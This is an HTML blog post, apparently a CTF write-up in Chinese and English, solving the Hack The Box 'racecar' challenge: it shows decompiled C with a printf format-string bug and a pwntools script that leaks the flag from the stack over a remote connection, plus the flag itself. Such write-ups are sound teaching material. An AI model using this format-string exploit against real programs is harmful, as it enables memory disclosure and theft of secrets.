@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  
+  <meta name="author" content="sovo" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      pwn 
+      
+      
+      |
+    
+     小小做题家
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Oranges</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">pwn</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2022-12-12 13:55:22
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags mr-10" title="标签"></i>
+                
+                <span class="span--tag mr-8">
+                  <a href="/tags/Format-string-attack/" title="Format_string_attack">
+                    #Format_string_attack
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="racecar"><a href="#racecar" class="headerlink" title="racecar"></a><a target="_blank" rel="noopener" href="https://app.hackthebox.com/challenges/racecar">racecar</a></h2><p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/12vMb9HTnCqCWH7QdChRrsw?pwd=0m8e">附件</a> </p>
+<img src="/2022/11/01/pwn/image-20221101205627365.png" class="" title="image-20221101205627365">
+
+<p>文件类型</p>
+<img src="/2022/11/01/pwn/image-20221101212057633.png" class="" title="image-20221101212057633">
+
+<p>ELF binary, not stripped - which means debugging information’s still there. So let’s find out what it has.</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/348777589">https://zhuanlan.zhihu.com/p/348777589</a></p>
+<img src="/2022/11/01/pwn/image-20221101212908897.png" class="" title="image-20221101212908897">
+
+<p><a target="_blank" rel="noopener" href="https://wangchujiang.com/linux-command/c/readelf.html">https://wangchujiang.com/linux-command/c/readelf.html</a></p>
+<p>Ghidra打开</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-comment">/* WARNING: Function: __x86.get_pc_thunk.bx replaced with injection: get_pc_thunk_bx */</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">car_menu</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br><br>&#123;<br>  <span class="hljs-type">int</span> iVar1;<br>  <span class="hljs-type">int</span> iVar2;<br>  uint __seed;<br>  <span class="hljs-type">int</span> iVar3;<br>  <span class="hljs-type">size_t</span> sVar4;<br>  <span class="hljs-type">char</span> *__format;<br>  FILE *__stream;<br>  <span class="hljs-type">int</span> in_GS_OFFSET;<br>  undefined *puVar5;<br>  undefined4 uVar6;<br>  undefined4 uVar7;<br>  uint local_54;<br>  <span class="hljs-type">char</span> local_3c [<span class="hljs-number">44</span>];<br>  <span class="hljs-type">int</span> local_10;<br>  <br>  local_10 = *(<span class="hljs-type">int</span> *)(in_GS_OFFSET + <span class="hljs-number">0x14</span>);<br>  uVar6 = <span class="hljs-number">0xffffffff</span>;<br>  uVar7 = <span class="hljs-number">0xffffffff</span>;<br>  <span class="hljs-keyword">do</span> &#123;<br>    <span class="hljs-built_in">printf</span>(&amp;DAT_00011948);<br>    iVar1 = read_int(uVar6,uVar7);<br>    <span class="hljs-keyword">if</span> ((iVar1 != <span class="hljs-number">2</span>) &amp;&amp; (iVar1 != <span class="hljs-number">1</span>)) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n%s[-] Invalid choice!%s\n&quot;</span>,&amp;DAT_00011548,&amp;DAT_00011538);<br>    &#125;<br>  &#125; <span class="hljs-keyword">while</span> ((iVar1 != <span class="hljs-number">2</span>) &amp;&amp; (iVar1 != <span class="hljs-number">1</span>));<br>  iVar2 = race_type();<br>  __seed = time((<span class="hljs-type">time_t</span> *)<span class="hljs-number">0x0</span>);<br>  srand(__seed);<br>  <span class="hljs-keyword">if</span> (((iVar1 == <span class="hljs-number">1</span>) &amp;&amp; (iVar2 == <span class="hljs-number">2</span>)) || ((iVar1 == <span class="hljs-number">2</span> &amp;&amp; (iVar2 == <span class="hljs-number">2</span>)))) &#123;<br>    iVar2 = rand();<br>    iVar2 = iVar2 % <span class="hljs-number">10</span>;<br>    iVar3 = rand();<br>    iVar3 = iVar3 % <span class="hljs-number">100</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (((iVar1 == <span class="hljs-number">1</span>) &amp;&amp; (iVar2 == <span class="hljs-number">1</span>)) || ((iVar1 == <span class="hljs-number">2</span> &amp;&amp; (iVar2 == <span class="hljs-number">1</span>)))) &#123;<br>    iVar2 = rand();<br>    iVar2 = iVar2 % <span class="hljs-number">100</span>;<br>    iVar3 = rand();<br>    iVar3 = iVar3 % <span class="hljs-number">10</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    iVar2 = rand();<br>    iVar2 = iVar2 % <span class="hljs-number">100</span>;<br>    iVar3 = rand();<br>    iVar3 = iVar3 % <span class="hljs-number">100</span>;<br>  &#125;<br>  local_54 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;<br>    sVar4 = <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;\n[*] Waiting for the race to finish...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (sVar4 &lt;= local_54) <span class="hljs-keyword">break</span>;<br>    <span class="hljs-built_in">putchar</span>((<span class="hljs-type">int</span>)<span class="hljs-string">&quot;\n[*] Waiting for the race to finish...&quot;</span>[local_54]);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;\n[*] Waiting for the race to finish...&quot;</span>[local_54] == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;<br>      sleep(<span class="hljs-number">0</span>);<br>    &#125;<br>    local_54 = local_54 + <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-keyword">if</span> (((iVar1 == <span class="hljs-number">1</span>) &amp;&amp; (iVar2 &lt; iVar3)) || ((iVar1 == <span class="hljs-number">2</span> &amp;&amp; (iVar3 &lt; iVar2)))) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n\n[+] You won the race!! You get 100 coins!\n&quot;</span>,&amp;DAT_00011540);<br>    coins = coins + <span class="hljs-number">100</span>;<br>    puVar5 = &amp;DAT_00011538;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Current coins: [%d]%s\n&quot;</span>,coins,&amp;DAT_00011538);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n[!] Do you have anything to say to the press after your big victory?\n&gt; %s&quot;</span>,<br>           &amp;DAT_000119de);<br>    __format = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x171</span>);<br>    __stream = fopen(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (__stream == (FILE *)<span class="hljs-number">0x0</span>) &#123;<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s[-] Could not open flag.txt. Please contact the creator.\n&quot;</span>,&amp;DAT_00011548,puVar5) ;<br>                    <span class="hljs-comment">/* WARNING: Subroutine does not return */</span><br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0x69</span>);<br>    &#125;<br>    fgets(local_3c,<span class="hljs-number">0x2c</span>,__stream);<br>    read(<span class="hljs-number">0</span>,__format,<span class="hljs-number">0x170</span>);<br>    <span class="hljs-built_in">puts</span>(<br>        <span class="hljs-string">&quot;\n\x1b[3mThe Man, the Myth, the Legend! The grand winner of the race wants the whole world  to know this: \x1b[0m&quot;</span><br>        );<br>    <span class="hljs-built_in">printf</span>(__format);<br>  &#125;<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (((iVar1 == <span class="hljs-number">1</span>) &amp;&amp; (iVar3 &lt; iVar2)) || ((iVar1 == <span class="hljs-number">2</span> &amp;&amp; (iVar2 &lt; iVar3)))) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n\n[-] You lost the race and all your coins!\n&quot;</span>,&amp;DAT_00011548);<br>    coins = <span class="hljs-number">0</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Current coins: [%d]%s\n&quot;</span>,<span class="hljs-number">0</span>,&amp;DAT_00011538);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (local_10 != *(<span class="hljs-type">int</span> *)(in_GS_OFFSET + <span class="hljs-number">0x14</span>)) &#123;<br>    __stack_chk_fail_local();<br>  &#125;<br>  <span class="hljs-keyword">return</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>printf(__format)处存在<a target="_blank" rel="noopener" href="https://owasp.org/www-community/attacks/Format_string_attack">Format string attack</a></p>
+<img src="/2022/11/01/pwn/image-20221101214535041.png" class="" title="image-20221101214535041">
+
+<p>IDA反编译后</p>
+<img src="/2022/11/01/pwn/image-20221101220156700.png" class="" title="image-20221101220156700">
+
+<img src="/2022/11/01/pwn/image-20221101222413146.png" class="" title="image-20221101222413146">
+
+<p>测试buf偏移</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ir0nstone/pwn-notes/blob/master/types/stack/format-string.md">https://github.com/ir0nstone/pwn-notes/blob/master/types/stack/format-string.md</a></p>
+<img src="/2022/11/01/pwn/image-20221101230244223.png" class="" title="image-20221101230244223">
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br> <br>offset_start_flag = <span class="hljs-number">12</span><br>len_of_flag = <span class="hljs-number">44</span><br>offset_end_flag = offset_start_flag + (<span class="hljs-number">44</span> // <span class="hljs-number">4</span>)     <span class="hljs-comment"># 44 characters / 4 bytes per hexadecimal = 11 hexadecimals</span><br> <br> <br>formatstring = <span class="hljs-string">&quot;&quot;</span><br> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(offset_start_flag, offset_end_flag):<br>    formatstring += <span class="hljs-string">&quot;%&quot;</span>+<span class="hljs-built_in">str</span>(i)+<span class="hljs-string">&quot;$p &quot;</span><br> <br> <br>r = remote(<span class="hljs-string">&quot;165.227.224.62&quot;</span>, <span class="hljs-number">30412</span>)<br> <br>r.sendlineafter(<span class="hljs-string">&quot;Name: &quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;Nickname: &quot;</span>, <span class="hljs-string">&quot;a&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>r.sendlineafter(<span class="hljs-string">&quot;&gt; &quot;</span>, formatstring)<br>r.recv()<br>response = r.recv()<br> <br><span class="hljs-comment"># need to format output</span><br>preflag = (response.decode(<span class="hljs-string">&quot;utf-8&quot;</span>).split(<span class="hljs-string">&quot;m\n&quot;</span>))[<span class="hljs-number">1</span>]<br>preflag = preflag.split()<br> <br>flag = <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> hexdecimal <span class="hljs-keyword">in</span> preflag:<br>    flag += p32(<span class="hljs-built_in">int</span>(hexdecimal, base=<span class="hljs-number">16</span>)).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>
+
+<p>HTB{why_d1d_1_s4v3_th3_fl4g_0n_th3_5t4ck?!}</p>
+<p>参考wp：</p>
+<p><a target="_blank" rel="noopener" href="https://www.akihakune.com/blog/racecar/">https://www.akihakune.com/blog/racecar/</a></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2022/11/01/web/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2022-12-12 13:55:22
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags mr-10" title="标签"></i>
+                    
+                    <span class="span--tag mr-8">
+                      <a href="/tags/Format-string-attack/" title="Format_string_attack">
+                        #Format_string_attack
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/11/14/%E5%A4%A7%E7%B4%A0%E6%95%B0%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#racecar"><span class="toc-text">racecar</span></a></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2023 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="搜索...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + pwn + '&url=' + http%3A%2F%2Fsovohelp.fit%2F2022%2F11%2F01%2Fpwn%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://sovohelp.fit/2022/11/01/pwn/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
